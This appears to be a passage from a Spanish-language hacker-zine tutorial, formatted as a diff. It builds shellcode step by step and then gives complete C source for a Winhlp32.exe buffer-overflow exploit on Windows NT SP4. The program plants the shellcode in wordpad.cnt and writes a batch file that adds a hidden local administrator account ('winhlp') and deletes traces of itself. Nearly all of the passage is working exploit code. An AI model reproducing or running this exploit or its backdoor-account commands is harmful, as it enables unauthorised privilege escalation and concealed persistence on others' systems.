+exit() tambien se exporta en msvcrt.dll en la direccion 0x78005BBA, que
+contiene un NULL. No es gran problema: rellenamos un registro con 0xFFFFFFFF
+y le restamos 0x87FFA445. Este codigo llama a exit(0)
+
+   /* primero el prologo del procedimiento */
+   push ebp
+   mov ebp,esp
+
+   /* truco para poner la direccion de exit() en EDX */
+   mov edx,0xFFFFFFFF
+   sub edx,0x87FFAF65
+
+   /* meterlo en la pila */
+   push edx
+
+   /* conseguimos algunos NULL, (nuestro codigo de retorno), y lo metemos */
+   xor eax,eax
+   push eax
+
+   /* y llamamos a exit()! */
+   call dword ptr[ebp-04h]
+
+Todo junto:
+
+   push ebp
+   mov ebp,esp
+   xor eax,eax
+   push eax
+   push eax
+   push eax
+   mov byte ptr[ebp-0Ch],4Dh
+   mov byte ptr[ebp-0Bh],53h
+   mov byte ptr[ebp-0Ah],56h
+   mov byte ptr[ebp-09h],43h
+   mov byte ptr[ebp-08h],52h
+   mov byte ptr[ebp-07h],54h
+   mov byte ptr[ebp-06h],2Eh
+   mov byte ptr[ebp-05h],44h
+   mov byte ptr[ebp-04h],4Ch
+   mov byte ptr[ebp-03h],4Ch
+   mov edx,0x77F1381A
+   push edx
+   lea eax,[ebp-0Ch]
+   push eax
+   call dword ptr[ebp-10h]
+   push ebp
+   mov ebp,esp
+   xor edi,edi
+   push edi
+   mov byte ptr [ebp-04h],43h
+   mov byte ptr [ebp-03h],4Dh
+   mov byte ptr [ebp-02h],44h
+   mov eax, 0x7801E1E1
+   push eax
+   lea eax,[ebp-04h]
+   push eax
+   call dword ptr [ebp-08h]
+   push ebp
+   mov ebp,esp
+   mov edx,0xFFFFFFFF
+   sub edx,0x87FFA445
+   push edx
+   xor eax,eax
+   push eax
+   call dword ptr[ebp-04h]
+
+Ahora necesitamos los codigos (opcodes) para todo esto. Lo hacemos con un
+programa que usa instrucciones __asm, y lo desensamblamos. Y esto es lo que
+metemos en nuestro codigo.
+A continuacion esta el codigo fuente del programa que creara un wordpad.cnt
+adecuado. Tambien crea un archivo BAT llamado ADD.BAT . Editalo como te
+parezca mejor.
+
+Ojo, esto solo funciona en una instalacion standard de NT con SP4, y espera
+que la version de msvcrt.dll sea 4.20.6201 . Ejecutalo desde el
+directorio winnt\help.
+
+<++> bugs/winhelp.c
+#include <stdio.h>
+#include <windows.h>
+#include <string.h>
+
+int main(void)
+{
+ char eip[5]="\xE5\x27\xF3\x77";
+ char
+ExploitCode[200]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
+90\x90\x90\x90\x90\x90\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x
+45\xF5\x53\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\x
+C6\x45\xFA\x2E\xC6\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA\x1A\x38\x
+F1\x77\x52\x8D\x45\xF4\x50\xFF\x55\xF0\x55\x8B\xEC\x33\xFF\x57\xC6\x45\xFC\x
+41\xC6\x45\xFD\x44\xC6\x45\xFE\x44\xB8\xE1\xE1\xA0\x77\x50\x8D\x45\xFC\x50\x
+FF\x55\xF8\x55\x8B\xEC\xBA\xBA\x5B\x9F\x77\x52\x33\xC0\x50\xFF\x55\xFC";
+
+ FILE *fd;
+ printf("\n\n*******************************************************\n");
+ printf("* WINHLPADD exploits a buffer overrun in Winhlp32.exe *\n");
+ printf("*   This version runs on Service Pack 4 machines and  *\n");
+ printf("*       assumes a msvcrt.dll version of 4.00.6201     *\n");
+ printf("*                                                     *\n");
+ printf("* (C) David Litchfield (mnemonix@globalnet.co.uk) '99 *\n");
+ printf("*******************************************************\n\n");
+
+ fd = fopen("wordpad.cnt", "r");
+ if (fd==NULL)
+  {
+   printf("\n\nWordpad.cnt not found or insufficient rights to access
+it.\nRun this from the WINNT\\HELP directory");
+   return 0;
+  }
+ fclose(fd);
+ printf("\nMaking a copy of real wordpad.cnt - wordpad.sav\n");
+ system("copy wordpad.cnt wordpad.sav");
+ printf("\n\nCreating wordpad.cnt with exploit code...");
+ fd = fopen("wordpad.cnt", "w+");
+ if (fd==NULL)
+  {
+   printf("Failed to open wordpad.cnt in write mode. Check you have
+sufficent rights\n");
+   return 0;
+  }
+ fprintf(fd,"1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%s%s\n",eip,ExploitCode)
+;
+ fprintf(fd,"2 Opening a document=WRIPAD_OPEN_DOC\n");
+ fclose(fd);
+ printf("\nCreating batch file add.bat\n\n");
+ fd = fopen("add.bat", "w");
+ if (fd == NULL)
+  {
+   printf("Couldn't create batch file. Manually create one instead");
+   return 0;
+  }
+ printf("The batch file will attempt to create a user account called
+\"winhlp\" and\n");
+ printf("with a password of \"winhlp!!\" and add it to the Local
+Administrators group.\n");
+ printf("Once this is done it will reset the files and delete itself.\n");
+ fprintf(fd,"net user winhlp winhlp!! /add\n");
+ fprintf(fd,"net localgroup administrators winhlp /add\n");
+ fprintf(fd,"del wordpad.cnt\ncopy wordpad.sav wordpad.cnt\n");
+ fprintf(fd,"del wordpad.sav\n");
+ fprintf(fd,"del add.bat\n");
+ fclose(fd);
+ printf("\nBatch file created.");
+ printf("\n\nCreated. Now open up Wordpad and click on Help\n");
+
+ return 0;
+
+}
+<-->
+
+Espero que hayais aprendido tanto como yo.
+
+*EOF*
